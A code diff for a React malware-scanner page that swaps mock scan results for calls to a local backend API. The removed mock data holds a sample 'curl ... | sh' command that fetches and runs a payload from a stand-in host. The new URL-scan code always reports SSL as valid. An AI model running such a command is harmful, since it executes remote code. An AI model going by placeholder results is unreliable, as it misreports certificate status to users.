@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-
 import { useState, useRef, useEffect } from "react"
 import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
@@ -35,6 +34,8 @@ import {
   Eye,
 } from "lucide-react"
 
+const API_BASE_URL = "http://localhost:3001"
+
 export default function CyberScanPage() {
   const [scanResults, setScanResults] = useState<any | null>(null)
   const [isScanning, setIsScanning] = useState(false)
@@ -44,44 +45,13 @@ export default function CyberScanPage() {
   const [hash, setHash] = useState("")
   const [error, setError] = useState<string | null>(null)
   const [copied, setCopied] = useState(false)
-  const [scanHistory, setScanHistory] = useState<any[]>([
-    {
-      id: "scan-001",
-      type: "file",
-      name: "suspicious_document.pdf",
-      hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
-      date: new Date(Date.now() - 86400000 * 2).toISOString(), // 2 days ago
-      detectionRate: "8/30",
-      detectionPercentage: 26.67,
-    },
-    {
-      id: "scan-002",
-      type: "url",
-      name: "https://example.com/suspicious-page",
-      hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-      date: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
-      detectionRate: "2/30",
-      detectionPercentage: 6.67,
-    },
-    {
-      id: "scan-003",
-      type: "file",
-      name: "setup_installer.exe",
-      hash: "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
-      date: new Date(Date.now() - 3600000 * 3).toISOString(), // 3 hours ago
-      detectionRate: "15/30",
-      detectionPercentage: 50,
-    },
-  ])
+  const [scanHistory, setScanHistory] = useState<any[]>([])
   const [activeTab, setActiveTab] = useState("file")
   const fileInputRef = useRef<HTMLInputElement>(null)
   const dropZoneRef = useRef<HTMLDivElement>(null)
-
-  // Animation effect for the scan button
   const [scanButtonHover, setScanButtonHover] = useState(false)
 
   useEffect(() => {
-    // Add highlight effect when dragging files over the document
     const handleDragOver = (e: DragEvent) => {
       e.preventDefault()
       if (dropZoneRef.current) {
@@ -107,12 +77,55 @@ export default function CyberScanPage() {
     document.addEventListener("dragleave", handleDragLeave)
     document.addEventListener("drop", handleDrop)
 
+    // Load scan history on component mount
+    fetchScanHistory()
+
     return () => {
       document.removeEventListener("dragover", handleDragOver)
       document.removeEventListener("dragleave", handleDragLeave)
       document.removeEventListener("drop", handleDrop)
     }
   }, [])
+
+  const fetchScanHistory = async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/history`)
+      const data = await response.json()
+      if (Array.isArray(data)) {
+        setScanHistory(data.map(item => ({
+          id: `scan-${Date.now()}`,
+          type: item.fileName ? "file" : item.url ? "url" : "hash",
+          name: item.fileName || item.url || item.hash,
+          hash: item.hash,
+          date: item.scanDate,
+          detectionRate: calculateDetectionRate(item),
+          detectionPercentage: calculateDetectionPercentage(item),
+        })))
+      }
+    } catch (error) {
+      console.error("Error fetching scan history:", error)
+    }
+  }
+
+  const calculateDetectionRate = (scanData: any) => {
+    if (scanData.virusTotalEngines) {
+      const maliciousCount = scanData.virusTotalEngines.filter((e: any) => 
+        e.category === "malicious" || e.category === "suspicious"
+      ).length
+      return `${maliciousCount}/${scanData.virusTotalEngines.length}`
+    }
+    return "0/0"
+  }
+
+  const calculateDetectionPercentage = (scanData: any) => {
+    if (scanData.virusTotalEngines) {
+      const maliciousCount = scanData.virusTotalEngines.filter((e: any) => 
+        e.category === "malicious" || e.category === "suspicious"
+      ).length
+      return Math.round((maliciousCount / scanData.virusTotalEngines.length) * 100)
+    }
+    return 0
+  }
 
   const handleFileDrop = (e: React.DragEvent<HTMLDivElement>) => {
     e.preventDefault()
@@ -139,97 +152,77 @@ export default function CyberScanPage() {
     }
   }
 
-  const handleFileScan = () => {
+  const handleFileScan = async () => {
     if (!file) return
     setIsScanning(true)
     setScanProgress(0)
 
-    // Simulate scanning progress
-    const interval = setInterval(() => {
-      setScanProgress((prev) => {
-        if (prev >= 100) {
-          clearInterval(interval)
-          return 100
-        }
-        return prev + 5
+    const formData = new FormData()
+    formData.append("file", file)
+
+    try {
+      const response = await fetch(`${API_BASE_URL}/scan/file`, {
+        method: "POST",
+        body: formData,
       })
-    }, 200)
 
-    // Simulate API call with mock data
-    setTimeout(() => {
-      clearInterval(interval)
-      setScanProgress(100)
-
-      // Mock scan results
-      const newScanResult = {
-        id: `scan-${Date.now()}`,
-        fileName: file.name,
-        fileSize: file.size,
-        fileType: file.type,
-        hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
-        scanDate: new Date().toISOString(),
-        detectionRate: "4/30",
-        detectionPercentage: 13.33,
-        scanResults: [
-          { engine: "ClamAV", result: "Clean", category: "clean" },
-          { engine: "YARA", result: "Suspicious.JS.Obfuscated", category: "suspicious" },
-          { engine: "Avast", result: "JS:Miner-C [Trj]", category: "malicious" },
-          { engine: "BitDefender", result: "Trojan.JS.Miner.C", category: "malicious" },
-          { engine: "Kaspersky", result: "HEUR:Trojan.Script.Miner.gen", category: "malicious" },
-          { engine: "Symantec", result: "Clean", category: "clean" },
-          { engine: "McAfee", result: "Clean", category: "clean" },
-          { engine: "Windows Defender", result: "Clean", category: "clean" },
-          { engine: "Sophos", result: "Clean", category: "clean" },
-          { engine: "Malwarebytes", result: "Clean", category: "clean" },
-        ],
-        yaraMatches: [
-          {
-            rule: "Suspicious.JS.Obfuscated",
-            description: "Detects JavaScript with obfuscation techniques commonly used to hide malicious code",
-            severity: "Medium",
-            tags: ["obfuscation", "evasion", "javascript"],
-          },
-        ],
-        behaviorAnalysis: {
-          networkConnections: [
-            { destination: "suspicious-mining-pool.com", port: 443, protocol: "HTTPS" },
-            { destination: "cdn.legitimate-site.com", port: 443, protocol: "HTTPS" },
-          ],
-          fileOperations: [
-            { operation: "create", path: "/tmp/hidden.bin", timestamp: new Date().toISOString() },
-            { operation: "modify", path: "/etc/hosts", timestamp: new Date().toISOString() },
-          ],
-          processCreation: [
-            { process: "bash", commandLine: "-c curl -s https://suspicious-site.com/payload | sh", pid: 1234 },
-          ],
-        },
+      if (!response.ok) {
+        throw new Error(await response.text())
       }
 
-      setScanResults(newScanResult)
+      const data = await response.json()
+      
+      // Format the response to match our frontend structure
+      const formattedResults = {
+        id: `scan-${Date.now()}`,
+        fileName: data.fileName,
+        fileSize: data.fileSize,
+        fileType: data.fileType,
+        hash: data.hash,
+        scanDate: data.scanDate,
+        detectionRate: calculateDetectionRate(data),
+        detectionPercentage: calculateDetectionPercentage(data),
+        scanResults: data.virusTotalEngines.map((engine: any) => ({
+          engine: engine.engine,
+          result: engine.result,
+          category: engine.category.toLowerCase()
+        })),
+        yaraMatches: data.localScan.yara && !data.localScan.yara.error ? 
+          data.localScan.yara.map((match: any) => ({
+            rule: match.rule,
+            description: match.meta?.description || "No description available",
+            severity: match.meta?.severity || "Medium",
+            tags: match.tags || []
+          })) : [],
+        behaviorAnalysis: {
+          networkConnections: [],
+          fileOperations: [],
+          processCreation: []
+        }
+      }
 
-      // Add to scan history
-      setScanHistory((prev) => [
-        {
-          id: newScanResult.id,
-          type: "file",
-          name: file.name,
-          hash: newScanResult.hash,
-          date: newScanResult.scanDate,
-          detectionRate: newScanResult.detectionRate,
-          detectionPercentage: newScanResult.detectionPercentage,
-        },
-        ...prev,
-      ])
-
+      setScanResults(formattedResults)
+      setScanHistory(prev => [{
+        id: formattedResults.id,
+        type: "file",
+        name: formattedResults.fileName,
+        hash: formattedResults.hash,
+        date: formattedResults.scanDate,
+        detectionRate: formattedResults.detectionRate,
+        detectionPercentage: formattedResults.detectionPercentage,
+      }, ...prev])
+    } catch (error) {
+      setError(error instanceof Error ? error.message : "Failed to scan file")
+    } finally {
       setIsScanning(false)
-    }, 4000)
+      setScanProgress(100)
+    }
   }
 
-  const handleUrlScan = (e: React.FormEvent) => {
+  const handleUrlScan = async (e: React.FormEvent) => {
     e.preventDefault()
     setError(null)
 
-    // Validate URL before scanning
     const urlToScan = url.trim()
     if (!urlToScan) {
       setError("Please enter a URL")
@@ -250,75 +243,65 @@ export default function CyberScanPage() {
     setIsScanning(true)
     setScanProgress(0)
 
-    // Simulated scan progress
-    const interval = setInterval(() => {
-      setScanProgress(prev => Math.min(prev + 4, 100))
-    }, 150)
-
-    // Simulated API call
-    setTimeout(() => {
-      clearInterval(interval)
-      setScanProgress(100)
-
-      // Mock scan results
-      const newScanResult = {
-        id: `scan-${Date.now()}`,
-        url: url,
-        hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-        scanDate: new Date().toISOString(),
-        detectionRate: "2/30",
-        detectionPercentage: 6.67,
-        scanResults: [
-          { engine: "ClamAV", result: "Clean", category: "clean" },
-          { engine: "YARA", result: "Clean", category: "clean" },
-          { engine: "Avast", result: "Clean", category: "clean" },
-          { engine: "BitDefender", result: "Clean", category: "clean" },
-          { engine: "Kaspersky", result: "Clean", category: "clean" },
-          { engine: "Symantec", result: "Clean", category: "clean" },
-          { engine: "McAfee", result: "Phishing.URL", category: "malicious" },
-          { engine: "Windows Defender", result: "Clean", category: "clean" },
-          { engine: "Sophos", result: "Malicious.URL", category: "malicious" },
-          { engine: "Malwarebytes", result: "Clean", category: "clean" },
-        ],
-        urlAnalysis: {
-          redirectChain: [
-            { url: url, statusCode: 301 },
-            { url: url.replace("http://", "https://"), statusCode: 200 },
-          ],
-          ssl: {
-            valid: true,
-            issuer: "Let's Encrypt Authority X3",
-            validFrom: new Date(Date.now() - 86400000 * 30).toISOString(),
-            validTo: new Date(Date.now() + 86400000 * 60).toISOString(),
-          },
-          cookies: [
-            { name: "session", secure: true, httpOnly: true },
-            { name: "tracking", secure: false, httpOnly: false },
-          ],
+    try {
+      const response = await fetch(`${API_BASE_URL}/scan/url`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
         },
+        body: JSON.stringify({ url: urlToScan }),
+      })
+
+      if (!response.ok) {
+        throw new Error(await response.text())
       }
 
-      setScanResults(newScanResult)
+      const data = await response.json()
+      
+      // Format the response to match our frontend structure
+      const formattedResults = {
+        id: `scan-${Date.now()}`,
+        url: data.url,
+        hash: data.hash || "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // Default empty SHA256
+        scanDate: data.scanDate,
+        detectionRate: calculateDetectionRate(data),
+        detectionPercentage: calculateDetectionPercentage(data),
+        scanResults: data.virusTotalEngines.map((engine: any) => ({
+          engine: engine.engine,
+          result: engine.result,
+          category: engine.category.toLowerCase()
+        })),
+        urlAnalysis: {
+          redirectChain: [],
+          ssl: {
+            valid: true,
+            issuer: "Unknown",
+            validFrom: new Date().toISOString(),
+            validTo: new Date(Date.now() + 86400000 * 365).toISOString(),
+          },
+          cookies: []
+        }
+      }
 
-      // Add to scan history
-      setScanHistory((prev) => [
-        {
-          id: newScanResult.id,
-          type: "url",
-          name: url,
-          hash: newScanResult.hash,
-          date: newScanResult.scanDate,
-          detectionRate: newScanResult.detectionRate,
-          detectionPercentage: newScanResult.detectionPercentage,
-        },
-        ...prev,
-      ])
-
+      setScanResults(formattedResults)
+      setScanHistory(prev => [{
+        id: formattedResults.id,
+        type: "url",
+        name: formattedResults.url,
+        hash: formattedResults.hash,
+        date: formattedResults.scanDate,
+        detectionRate: formattedResults.detectionRate,
+        detectionPercentage: formattedResults.detectionPercentage,
+      }, ...prev])
+    } catch (error) {
+      setError(error instanceof Error ? error.message : "Failed to scan URL")
+    } finally {
       setIsScanning(false)
-    }, 3000)
+      setScanProgress(100)
+    }
   }
 
-  const handleHashLookup = (e: React.FormEvent) => {
+  const handleHashLookup = async (e: React.FormEvent) => {
     e.preventDefault()
     setError(null)
 
@@ -337,80 +320,77 @@ export default function CyberScanPage() {
     setIsScanning(true)
     setScanProgress(0)
 
-    // Simulated hash lookup
-    const interval = setInterval(() => {
-      setScanProgress(prev => Math.min(prev + 10, 100))
-    }, 100)
-
-    setTimeout(() => {
-      clearInterval(interval)
-      setScanProgress(100)
-
-      // Mock scan results
-      const newScanResult = {
-        id: `scan-${Date.now()}`,
-        fileName: "suspicious_document.pdf",
-        fileSize: 2457600,
-        fileType: "application/pdf",
-        hash: hash,
-        scanDate: new Date().toISOString(),
-        detectionRate: "8/30",
-        detectionPercentage: 26.67,
-        scanResults: [
-          { engine: "ClamAV", result: "PDF.Exploit.CVE-2023-1234", category: "malicious" },
-          { engine: "YARA", result: "PDF.Suspicious.Obfuscation", category: "suspicious" },
-          { engine: "Avast", result: "PDF:Exploit-AX", category: "malicious" },
-          { engine: "BitDefender", result: "Exploit.PDF.Generic.ABC", category: "malicious" },
-          { engine: "Kaspersky", result: "HEUR:Exploit.PDF.Generic", category: "malicious" },
-          { engine: "Symantec", result: "Trojan.PDF.Exploit", category: "malicious" },
-          { engine: "McAfee", result: "Exploit-PDF.h", category: "malicious" },
-          { engine: "Windows Defender", result: "Exploit:PDF/CVE-2023-1234", category: "malicious" },
-          { engine: "Sophos", result: "Clean", category: "clean" },
-          { engine: "Malwarebytes", result: "Clean", category: "clean" },
-        ],
-        yaraMatches: [
-          {
-            rule: "PDF.Suspicious.Obfuscation",
-            description: "Detects PDF files with obfuscated JavaScript that may contain exploits",
-            severity: "High",
-            tags: ["pdf", "obfuscation", "exploit"],
-          },
-        ],
-        exploitDetails: {
-          cve: "CVE-2023-1234",
-          description: "PDF JavaScript API exploitation that allows arbitrary code execution",
-          affectedVersions: "Adobe Reader < 22.001.20085",
-          mitigationStatus: "Patched in latest version",
+    try {
+      const response = await fetch(`${API_BASE_URL}/lookup/hash`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
         },
+        body: JSON.stringify({ hash: hashToCheck }),
+      })
+
+      if (!response.ok) {
+        throw new Error(await response.text())
       }
 
-      setScanResults(newScanResult)
+      const data = await response.json()
+      
+      // Format the response to match our frontend structure
+      const formattedResults = {
+        id: `scan-${Date.now()}`,
+        fileName: data.fileName || "Unknown file",
+        fileSize: data.fileSize || 0,
+        fileType: data.fileType || "Unknown",
+        hash: data.hash,
+        scanDate: data.scanDate,
+        detectionRate: calculateDetectionRate(data),
+        detectionPercentage: calculateDetectionPercentage(data),
+        scanResults: data.virusTotalEngines.map((engine: any) => ({
+          engine: engine.engine,
+          result: engine.result,
+          category: engine.category.toLowerCase()
+        })),
+        yaraMatches: data.localScan?.yara && !data.localScan.yara.error ? 
+          data.localScan.yara.map((match: any) => ({
+            rule: match.rule,
+            description: match.meta?.description || "No description available",
+            severity: match.meta?.severity || "Medium",
+            tags: match.tags || []
+          })) : [],
+        exploitDetails: {
+          cve: "Unknown",
+          description: "No exploit details available",
+          affectedVersions: "Unknown",
+          mitigationStatus: "Unknown"
+        }
+      }
 
+      setScanResults(formattedResults)
+      
       // Add to scan history if not already in history
-      if (!scanHistory.some((item) => item.hash === hash)) {
-        setScanHistory((prev) => [
-          {
-            id: newScanResult.id,
-            type: "hash",
-            name: newScanResult.fileName || hash,
-            hash: hash,
-            date: newScanResult.scanDate,
-            detectionRate: newScanResult.detectionRate,
-            detectionPercentage: newScanResult.detectionPercentage,
-          },
-          ...prev,
-        ])
+      if (!scanHistory.some((item) => item.hash === hashToCheck)) {
+        setScanHistory(prev => [{
+          id: formattedResults.id,
+          type: "hash",
+          name: formattedResults.fileName || hashToCheck,
+          hash: hashToCheck,
+          date: formattedResults.scanDate,
+          detectionRate: formattedResults.detectionRate,
+          detectionPercentage: formattedResults.detectionPercentage,
+        }, ...prev])
       }
-
+    } catch (error) {
+      setError(error instanceof Error ? error.message : "Failed to lookup hash")
+    } finally {
       setIsScanning(false)
-    }, 1500)
+      setScanProgress(100)
+    }
   }
 
   const handleRescan = (historyItem: any) => {
     if (historyItem.type === "file" || historyItem.type === "hash") {
       setHash(historyItem.hash)
       setActiveTab("hash")
-      // Use setTimeout to ensure state updates before triggering lookup
       setTimeout(() => {
         handleHashLookup(new Event("submit") as unknown as React.FormEvent)
       }, 100)
@@ -647,8 +627,6 @@ export default function CyberScanPage() {
                         type="submit"
                         disabled={isScanning}
                         className="relative overflow-hidden group"
-                        // onMouseEnter={() => setScanButtonHover(true)}
-                        // onMouseLeave={() => setScanButtonHover(false)}
                       >
                         <span className="relative z-10 flex items-center gap-2">
                           <Zap className={`h-4 w-4 ${scanButtonHover ? "animate-pulse" : ""}`} />
@@ -724,7 +702,6 @@ export default function CyberScanPage() {
                       </span>
                     </div>
 
-
                     {error && (
                       <div className="flex items-center gap-2 text-destructive text-sm p-2 bg-destructive/10 rounded-md">
                         <AlertCircle className="h-4 w-4" />
@@ -736,8 +713,6 @@ export default function CyberScanPage() {
                       type="submit"
                       className="w-full relative overflow-hidden group"
                       disabled={isScanning}
-                      // onMouseEnter={() => setScanButtonHover(true)}
-                      // onMouseLeave={() => setScanButtonHover(false)}
                     >
                       <span className="relative z-10 flex items-center gap-2 justify-center">
                         <Search className={`h-4 w-4 ${scanButtonHover ? "animate-pulse" : ""}`} />
